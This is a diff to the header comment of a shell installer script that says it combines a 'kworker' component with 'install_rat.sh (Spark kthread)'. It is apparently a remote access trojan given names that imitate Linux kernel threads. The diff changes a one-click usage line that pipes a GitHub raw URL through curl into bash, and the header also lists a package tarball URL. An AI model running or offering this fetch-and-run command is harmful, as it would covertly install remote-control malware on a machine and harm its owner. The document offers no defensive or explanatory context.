@@ -4,7 +4,7 @@
 # kworker + kthread combined one-click installer (install_all.sh)
 # Combines install.sh (kworker) and install_rat.sh (Spark kthread).
 # Usage:
-#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install_all.sh)"
+#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/scripts/install_all.sh)"
 # Package:
 #   https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz
 # ============================================
